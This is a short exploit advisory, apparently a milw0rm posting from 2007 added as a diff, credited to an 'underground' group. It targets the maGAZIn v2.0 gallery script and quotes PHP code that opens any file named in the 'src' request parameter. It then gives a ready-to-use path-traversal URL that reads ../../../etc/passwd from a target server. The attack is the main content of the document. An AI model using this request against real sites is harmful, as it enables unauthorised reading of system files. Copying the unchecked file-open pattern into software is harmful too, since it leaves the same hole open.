@@ -1,0 +1,50 @@
+        \\\|///
+      \\  - -  //
+       (  @ @ )
+----oOOo--(_)-oOOo---------------------------------------------------
+
+[ Y! Underground Group ]
+[   Dj7xpl@yahoo.com   ]
+[    Dj7xpl.2600.ir    ]
+
+----ooooO-----Ooooo--------------------------------------------------
+    (   )     (   )
+     \ (       ) /
+      \_)     (_/
+
+---------------------------------------------------------------------
+
+[!] Portal   :   maGAZIn v2.0
+[!] Download :   http://www.pinkcrow.net/Scripts/gallery.php
+[!] Type     :   Remote File Disclosure Vulnerability
+
+---------------------------------------------------------------------
+
+---------------------------------------------------------------------
+
+Vuln Code :  Line (152 - 157)
+
+[Code]
+if ($fp = @fopen($_SERVER['DOCUMENT_ROOT'].$_REQUEST['src'], 'rb')) {
+		$OriginalImageData = fread($fp, filesize($_SERVER['DOCUMENT_ROOT'].$_REQUEST['src']));
+		fclose($fp);
+	} else {
+		ErrorImage('cannot open '.$_SERVER['DOCUMENT_ROOT'].$_REQUEST['src'], 400, 50);
+	}
+[/Code]
+
+---------------------------------------------------------------------
+
+---------------------------------------------------------------------
+
+Bug :
+
+http://[Target]/[Path]/phpThumb.php?src=[Local File]
+
+Example :
+
+http://Target.ir/Gallery/phpThumb.php?src=../../../etc/passwd
+
+---------------------------------------------------------------------
+
+# milw0rm.com [2007-05-11]
